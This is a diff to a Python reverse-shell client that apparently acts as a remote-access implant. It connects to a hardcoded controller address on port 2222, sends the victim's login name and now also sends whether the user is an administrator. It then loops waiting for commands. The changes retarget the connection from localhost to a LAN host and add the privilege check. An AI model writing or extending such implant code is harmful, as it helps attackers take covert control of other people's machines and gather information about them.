@@ -2,6 +2,7 @@ import socket
 import subprocess
 import os
 import sys
+import ctypes
 
 #inbound function
 def inbound():
@@ -25,6 +26,7 @@ def session_handler():
     print(f'[+] Connecting to {host_ip} ')
     sock.connect((host_ip, host_port))
     outbound(os.getlogin())
+    outbound(ctypes.windll.shell32.IsUserAnAdmin())
     print(f'[+] Connected to {host_ip}. ')
     while True:
         message = inbound()
@@ -57,7 +59,7 @@ if __name__ == '__main__':
     try:
         #host_ip = sys.argv[1]
         #host_port = int(sys.argv[2])
-        host_ip = '127.0.0.1'
+        host_ip = '192.168.1.103'
         host_port = 2222
         session_handler()
     except IndexError:
